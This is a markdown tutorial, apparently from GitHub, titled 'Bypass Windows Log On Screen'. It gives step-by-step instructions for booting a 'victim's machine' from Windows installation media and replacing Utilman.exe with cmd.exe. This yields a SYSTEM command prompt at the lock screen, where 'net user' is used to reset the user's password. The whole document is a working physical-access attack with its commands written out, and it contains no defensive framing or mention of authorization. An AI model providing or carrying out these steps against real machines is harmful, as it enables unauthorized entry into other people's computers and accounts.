# Bypass Windows Log On Screen

# 00 Create Windows Installation Media USB

Download The Windows Installation Media Tool And Create A USB Installation Media
```
https://www.microsoft.com/en-us/software-download/windows10
```
![1](https://user-images.githubusercontent.com/94680549/228337624-e885941f-77e0-446e-a49f-4f4d0eb76dd8.png)

![2](https://user-images.githubusercontent.com/94680549/228338047-b9e13f79-37d3-49c2-b227-7d4625318e16.png)

![3](https://user-images.githubusercontent.com/94680549/228354567-a62803ee-b028-44a3-aa12-731d07784744.png)

![4](https://user-images.githubusercontent.com/94680549/228354588-b2458a32-8136-450d-8572-90ebf1179be3.png)

![5](https://user-images.githubusercontent.com/94680549/228354600-e22fe889-3663-4b5f-bc6c-07c492018de9.png)

![6](https://user-images.githubusercontent.com/94680549/228354616-d8fc3abf-a305-40c9-afd1-941fd8f59f0d.png)

![7](https://user-images.githubusercontent.com/94680549/228354636-d78dcda2-9ef0-4476-9f3d-3eb9cd5da325.png)

![8](https://user-images.githubusercontent.com/94680549/228354647-dfd3312b-abef-47a2-972e-c8a2d77fcd40.png)


# 01 Change Utilman.exe To cmd.exe
>#Once The Installation Media Is Done, Plug In The USB Into The Victim's Machine
>#We Are Going To Change The Utilman.exe(Accessibility Function) To Open CMD Instead
![9](https://user-images.githubusercontent.com/94680549/228472093-4686d36e-e42e-4d44-86d7-d0e9b2784fc6.png)

1.Restart While Holding The Shift Key
![10](https://user-images.githubusercontent.com/94680549/228472285-e91d753e-e66c-4920-abd1-1b9bbbadafb9.png)

2.Once You Are In This Menu, Select Use A Device
![1](https://user-images.githubusercontent.com/94680549/228473575-eee0bd01-3650-4090-9cf6-d01a5145e819.jpg)
Then Select The USB Installation Media You Created
![2](https://user-images.githubusercontent.com/94680549/228473698-5e6c03f3-2389-409e-8222-a3650e14ae49.jpg)

3.Once You Are In The Windows Installaion Menu, Press Shift+F10
![IMG20230329115443](https://user-images.githubusercontent.com/94680549/228477409-2259ad21-34f7-43f5-a0ff-a2271af86832.jpg)


4.Once cmd Is Open
To List The Logical Drives/Disks On The Machine
```shell
wmic logicaldisk get name
```
![11](https://user-images.githubusercontent.com/94680549/228474816-f9cce337-4afd-4358-9eab-9e335cd47cf0.png)

Check To See Which Drive Contains Windows
![12](https://user-images.githubusercontent.com/94680549/228475150-2111c046-c4be-4c13-bed3-d8a766c1a1f2.png)

Change The Directory To Windows\System32 Where Utilman.exe Is Located
```shell
cd Windows\System32
```
![13](https://user-images.githubusercontent.com/94680549/228475750-8f59ef51-6583-4ae2-9268-a7f8f4818d2f.png)

Rename Utilman.exe To Utilman2.exe 
```shell
ren Utilman.exe Utilman2.exe
```
![14](https://user-images.githubusercontent.com/94680549/228475950-3f7f2de3-483f-4baf-ac43-711c662f7f62.png)

Copy cmd.exe As Utilman.exe
![15](https://user-images.githubusercontent.com/94680549/228476014-5fc12e2d-0af2-4794-ad6c-c3909ea3616a.png)

Once The Copy Is Successful Close CMD And The Windows Installation
![IMG20230329115809](https://user-images.githubusercontent.com/94680549/228478050-9c1c6aa8-9035-43de-9391-e02ece9a25f7.jpg)

Once The Device Boots Up, Click On Accessibility/Utilman To Open CMD
![16](https://user-images.githubusercontent.com/94680549/228478391-218aa8f3-19fa-4361-ad8b-9a524419b800.png)

To Change The Password Of The User
```shell
net user {user} {password}
```
![17](https://user-images.githubusercontent.com/94680549/228478711-df70880c-b9bd-4da1-9ce3-72d97ac131f2.png)

Once Done You Can Now Login With The New Passoword You Set
![18](https://user-images.githubusercontent.com/94680549/228478935-995dea38-f21b-419c-8671-68d667e9a6a0.png)



